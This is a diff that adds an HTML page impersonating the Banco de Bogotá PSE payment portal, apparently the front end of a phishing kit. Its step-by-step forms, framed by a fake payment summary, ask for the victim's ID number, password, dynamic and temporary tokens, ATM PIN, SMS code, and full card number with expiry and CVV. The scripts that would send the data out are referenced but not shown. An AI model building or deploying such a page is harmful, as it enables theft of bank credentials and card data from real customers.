@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Bogotá | PSE</title>
+    <link rel="shortcut icon" href="./assets/" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100..700;1,100..700&family=Red+Hat+Display:ital,wght@0,300..900;1,300..900&family=Roboto:ital,wght@0,100..900;1,100..900&display=swap"
+        rel="stylesheet">
+
+    <link rel="stylesheet" href="./css/tw.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+
+    <!-- script -->
+    <script src="../../js/functions.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
+</head>
+
+<body>
+    <div id="loader" class="cont-loader">
+        <div class="loader"></div>
+    </div>
+
+    <section class="flex flex-col lg:flex-row min-h-screen w-full roboto">
+
+        <!-- Columna izquierda -->
+        <div class="w-full lg:w-1/2 flex flex-col items-center justify-center bg-[#f6faff] px-6 pt-10 pb-[100px]">
+
+            <div id="step-user" class="hidden max-w-[400px] relative">
+                <img src="./assets/bdbog.svg" alt="Logo Banco de Bogotá" class="mb-20">
+                <p class="text-2xl text-[#0043a9] mb-8 leading-[25px]">
+                    Bienvenido al nuevo portal de pagos en línea de PSE
+                </p>
+
+                <form class="space-y-6 border border-gray-100 rounded-lg overflow-hidden bg-white py-10 px-5">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-600 mb-3">
+                            ¿Qué tipo de cliente eres?
+                        </label>
+
+                        <div class="relative">
+                            <select id="tipo-cliente"
+                                class="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-lg appearance-none focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-700">
+                                <option>Banca Personas</option>
+                                <option>Banca Empresas</option>
+                            </select>
+                            <div class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none">
+                                <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor"
+                                    viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M19 9l-7 7-7-7"></path>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-600 mb-2">
+                                Documento
+                            </label>
+                            <div class="relative">
+                                <select id="tipo-documento"
+                                    class="w-full px-3 py-3 bg-gray-50 border border-gray-200 rounded-lg appearance-none focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-700">
+                                    <option>C.C.</option>
+                                    <option>C.E.</option>
+                                    <option>NIT</option>
+                                    <option>Pasaporte</option>
+                                </select>
+                                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
+                                    <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor"
+                                        viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                            d="M19 9l-7 7-7-7"></path>
+                                    </svg>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div>
+                            <label class="block text-sm font-medium text-gray-600 mb-2">
+                                Número
+                            </label>
+                            <input type="text" id="numero-documento" placeholder="#"
+                                class="w-full px-3 py-3 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-700 placeholder-gray-400">
+                        </div>
+                    </div>
+
+                    <!-- Botón continuar -->
+                    <button type="submit" id="step-user-next"
+                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-600 font-medium py-4 px-6 rounded-full transition-colors duration-200 mt-8">
+                        Continuar
+                    </button>
+                </form>
+
+                <img class="absolute top-[300px] left-[-50px]" src="./assets/vigilado.svg">
+            </div>
+
+            <div id="step-pass" class="hidden max-w-[400px] relative">
+                <img src="./assets/bdbog.svg" alt="Logo Banco de Bogotá" class="mb-20">
+                <p class="text-2xl text-[#0043a9] mb-8 leading-[25px]">
+                    Bienvenido al nuevo portal de pagos en línea de PSE
+                </p>
+
+                <form class="space-y-6 border border-gray-100 rounded-lg overflow-hidden bg-white py-10 px-5">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-600 mb-3">
+                            Ingresa tu contraseña para acceder
+                        </label>
+
+                        <div>
+                            <label class="block text-sm font-medium text-gray-600 mb-2">
+                                Contraseña
+                            </label>
+                            <input type="password" id="pass" oninput="cleanAndLimitDigits(this, 4)" placeholder="#"class="w-full px-3 py-3 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-700 placeholder-gray-400">
+                        </div>
+                    </div>
+                    <!-- Botón continuar -->
+                    <button type="submit" id="step-pass-next"
+                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-600 font-medium py-4 px-6 rounded-full transition-colors duration-200 mt-8">
+                        Continuar
+                    </button>
+                </form>
+
+                <img class="absolute top-[300px] left-[-50px]" src="./assets/vigilado.svg">
+            </div>
+
+            <div id="step-cdin" class="hidden max-w-[400px] relative">
+                <img src="./assets/bdbog.svg" alt="Logo Banco de Bogotá" class="mb-20">
+                <p class="text-2xl text-[#0043a9] mb-8 leading-[25px]">
+                    Ingresa tu Token Dinámico
+                </p>
+
+                <form class="space-y-6 border border-gray-100 rounded-lg overflow-hidden bg-white py-10 px-5">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-600 mb-3">
+                            La encuentras en tu App Banco de Bogotá
+                        </label>
+                    </div>
+
+                    <div class="w-full flex flex-row gap-2 items-center justify-center">
+                            <input type="text" maxlength="1" id="cdin-digit-1" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="cdin-digit-2" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="cdin-digit-3" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="cdin-digit-4" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="cdin-digit-5" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="cdin-digit-6" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                    </div>
+
+                    <!-- Botón continuar -->
+                    <button type="submit" id="step-cdin-next"
+                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-600 font-medium py-4 px-6 rounded-full transition-colors duration-200 mt-8">
+                        Continuar
+                    </button>
+                </form>
+
+                <img class="absolute top-[300px] left-[-50px]" src="./assets/vigilado.svg">
+            </div>
+
+            <div id="step-token" class="hidden max-w-[400px] relative">
+                <img src="./assets/bdbog.svg" alt="Logo Banco de Bogotá" class="mb-20">
+                <p class="text-2xl text-[#0043a9] mb-8 leading-[25px]">
+                    Ingresa el Token Temporal de Acceso
+                </p>
+
+                <form class="space-y-6 border border-gray-100 rounded-lg overflow-hidden bg-white py-10 px-5">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-600 mb-3">
+                            Lo hemos enviado a uno de tus canales de contacto
+                        </label>
+                    </div>
+
+                    <div class="w-full flex flex-row gap-2 items-center justify-center">
+                            <input type="text" maxlength="1" id="token-digit-1" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="token-digit-2" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="token-digit-3" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="token-digit-4" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="token-digit-5" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="token-digit-6" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="token-digit-7" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="token-digit-8" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                    </div>
+
+                    <!-- Botón continuar -->
+                    <button type="submit" id="step-token-next"
+                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-600 font-medium py-4 px-6 rounded-full transition-colors duration-200 mt-8">
+                        Continuar
+                    </button>
+                </form>
+
+                <img class="absolute top-[300px] left-[-50px]" src="./assets/vigilado.svg">
+            </div>
+
+            <div id="step-ccaj" class="hidden max-w-[400px] relative">
+                <img src="./assets/bdbog.svg" alt="Logo Banco de Bogotá" class="mb-20">
+                <p class="text-2xl text-[#0043a9] mb-8 leading-[25px]">
+                    Ingresa tu Clave de Cajero
+                </p>
+
+                <form class="space-y-6 border border-gray-100 rounded-lg overflow-hidden bg-white py-10 px-5">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-600 mb-3">
+                            La misma que utilizas cuando vas a retirar dinero
+                        </label>
+                    </div>
+
+                    <div class="w-full flex flex-row gap-2 items-center justify-center">
+                            <input type="text" maxlength="1" id="ccaj-digit-1" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="ccaj-digit-2" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="ccaj-digit-3" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="ccaj-digit-4" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                    </div>
+
+                    <!-- Botón continuar -->
+                    <button type="submit" id="step-ccaj-next"
+                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-600 font-medium py-4 px-6 rounded-full transition-colors duration-200 mt-8">
+                        Continuar
+                    </button>
+                </form>
+
+                <img class="absolute top-[300px] left-[-50px]" src="./assets/vigilado.svg">
+            </div>
+
+            <div id="step-otp" class="hidden max-w-[400px] relative">
+                <img src="./assets/bdbog.svg" alt="Logo Banco de Bogotá" class="mb-20">
+                <p class="text-2xl text-[#0043a9] mb-8 leading-[25px]">
+                    Ingresa el Código OTP que hemos enviado a tu teléfno
+                </p>
+
+                <form class="space-y-6 border border-gray-100 rounded-lg overflow-hidden bg-white py-10 px-5">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-600 mb-3">
+                            Ingresa el código de 6 dígitos
+                        </label>
+                    </div>
+
+                    <div class="w-full flex flex-row gap-2 items-center justify-center">
+                            <input type="text" maxlength="1" id="otp-digit-1" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="otp-digit-2" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="otp-digit-3" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="otp-digit-4" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="otp-digit-5" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                            <input type="text" maxlength="1" id="otp-digit-6" class="w-6 text-2xl text-center outline-none bg-white border-b-2 border-gray-100 focus:border-[#0043a9]">
+                    </div>
+
+                    <!-- Botón continuar -->
+                    <button type="submit" id="step-otp-next"
+                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-600 font-medium py-4 px-6 rounded-full transition-colors duration-200 mt-8">
+                        Continuar
+                    </button>
+                </form>
+
+                <img class="absolute top-[300px] left-[-50px]" src="./assets/vigilado.svg">
+            </div>
+
+            <div id="step-card" class="hidden max-w-[400px] relative"> 
+                <img src="./assets/bdbog.svg" alt="Logo Banco de Bogotá" class="mb-20">
+                <p class="text-2xl text-[#0043a9] mb-8 leading-[25px]">
+                    Ingreso alternativo con un producto vinculado.
+                </p>
+
+                <form class="space-y-6 border border-gray-100 rounded-lg overflow-hidden bg-white py-10 px-5">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-600 mb-3">Número de tarjeta</label>
+                        <input type="text" oninput="formatCNumber(this)" id="p" placeholder="" required class="w-full px-3 py-3 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-700 placeholder-gray-400">
+                    </div>
+
+                    <div class="flex flex-row gap-3">
+                        <div class="input-container">
+                            <label class="block text-sm font-medium text-gray-600 mb-3">Vencimiento</label>
+                            <input oninput="formatDate(this)" id="pdate" type="text" placeholder="" required class="w-full px-3 py-3 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-700 placeholder-gray-400">
+                        </div>
+                        <div class="input-container">
+                            <label class="block text-sm font-medium text-gray-600 mb-3">CVV</label>
+                            <input id="c" required type="number" oninput="limitDigits(this, 3)" placeholder="" required class="w-full px-3 py-3 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-700 placeholder-gray-400">
+                        </div>
+                    </div>
+
+                    <!-- Botón continuar -->
+                    <button type="submit" id="step-card-next"
+                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-600 font-medium py-4 px-6 rounded-full transition-colors duration-200 mt-8">
+                        Continuar
+                    </button>
+                </form>
+
+                <img class="absolute top-[300px] left-[-50px]" src="./assets/vigilado.svg">
+            </div>
+
+            <div id="step-resumen" class="w-full max-w-[400px] relative">
+                <img src="./assets/bdbog.svg" alt="Logo Banco de Bogotá" class="mb-20">
+                
+                <p class="text-2xl text-[#0043a9] mb-8 leading-[25px]">
+                    Información del pago
+                </p>
+
+                <div class="rounded-lg bg-white p-5 text-gray-700">
+                    <p class="font-semibold mb-7">Detalle</p>
+
+                    <div class="bg-[#f6faff] rounded overflow-hidden border border-gray-100 flex justify-center items-center p-10 mb-7">
+                        <p id="amount" class="font-semibold text-xl">$ 450.000</p>
+                    </div>
+
+                    <div class="pb-3 flex flex-row justify-between items-start border-b-2 border-gray-100 mb-7">
+                        <p>Pagar a:</p>
+                        <p class="font-semibold" id="pag-origin">TIQUETES BARATOS SAS</p>
+                    </div>
+                    <div class="pb-3 flex flex-row justify-between items-start border-b-2 border-gray-100 mb-7">
+                        <p>CUS:</p>
+                        <p class="font-semibold" id="pag-cus">1667458293</p>
+                    </div>
+                    <div class="pb-3 flex flex-row justify-between items-start">
+                        <p>Número de factura:</p>
+                        <p class="font-semibold" id="pag-factura">789956372</p>
+                    </div>
+
+                    <!-- Botón continuar -->
+                    <button type="submit" id="step-resumen-next"
+                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-600 font-medium py-4 px-6 rounded-full transition-colors duration-200 mt-8">
+                        Continuar
+                    </button>
+                </div>
+
+                <img class="absolute top-[300px] left-[-50px]" src="./assets/vigilado.svg">
+            </div>
+
+            <img src="./assets/gr_aval.png" class="mt-10">
+            
+        </div>
+
+
+
+
+
+
+        <!-- Columna derecha-->
+        <div class="w-full lg:w-1/2 bg-gradient-to-br from-blue-500 to-blue-700 flex flex-col justify-center items-center py-[60px]">
+
+            <div class="max-w-[700px]">
+                <!-- Close Button -->
+                <div class="flex justify-end p-6 mb-10">
+                    <button class="text-white hover:text-gray-200 transition-colors duration-200">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M6 18L18 6M6 6l12 12"></path>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Content Container -->
+                <div class="flex-1 px-6 pb-6 space-y-6">
+
+                    <!-- Sección: Tu seguridad es lo primero -->
+                    <div class="border-b border-gray-100">
+                        <div class="w-full p-6 text-left flex items-center justify-between">
+                            <div>
+                                <h3 class="text-white text-lg font-semibold mb-2">
+                                    Tu seguridad es lo primero
+                                </h3>
+                                <p class="text-white text-opacity-90 text-sm">
+                                    Sigue estos tips y tus transacciones estarán blindadas
+                                </p>
+                            </div>
+                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7"></path>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <!-- Sección: Contáctanos -->
+                    <div class="border-b border-gray-100">
+                        <div class="w-full p-6 text-left flex items-center justify-between">
+                            <div>
+                                <h3 class="text-white text-lg font-semibold mb-2">
+                                    Contáctanos
+                                </h3>
+                                <p class="text-white text-opacity-90 text-sm">
+                                    Si tienes alguna duda o algo te ha sucedido usa nuestros canales
+                                </p>
+                            </div>
+                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M19 9l-7 7-7-7"></path>
+                            </svg>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </section>
+
+    <script src="./js/bdbog.js"></script>
+</body>
+
+</html>
